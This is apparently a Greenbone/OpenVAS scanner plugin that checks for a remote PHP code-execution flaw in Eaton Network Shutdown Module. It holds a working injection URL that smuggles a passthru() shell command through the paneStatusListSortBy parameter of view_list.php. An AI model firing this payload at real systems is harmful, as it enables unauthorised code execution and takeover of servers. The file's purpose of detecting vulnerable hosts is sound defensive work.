if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103522" );
	script_bugtraq_id( 54161 );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_name( "Eaton Network Shutdown Module Arbitrary PHP Code Execution Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/54161" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2012-07-23 11:34:22 +0200 (Mon, 23 Jul 2012)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "gb_pi3web_detect.sc", "os_detection.sc" );
	script_mandatory_keys( "pi3web/detected" );
	script_tag( name: "summary", value: "Eaton Network Shutdown Module is prone to a remote PHP code-execution
  vulnerability." );
	script_tag( name: "impact", value: "An attacker can exploit this issue to inject and execute arbitrary
  malicious PHP code in the context of the webserver process. This may
  facilitate a compromise of the application and the underlying system,
  other attacks are also possible." );
	script_tag( name: "affected", value: "Network Shutdown Module 3.21 build 01 is vulnerable, other versions may also be affected." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
CPE = "cpe:/a:pi3:pi3web";
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
banner = http_get_remote_headers( port: port );
if(!ContainsString( banner, "NSMID=" )){
	exit( 0 );
}
commands = exploit_commands();
for cmd in keys( commands ) {
	url = "/view_list.php?paneStatusListSortBy=0%22%5d)%20%26%20passthru(%22" + commands[cmd] + "%22)%3b%23";
	if(http_vuln_check( port: port, url: url, pattern: cmd )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 0 );

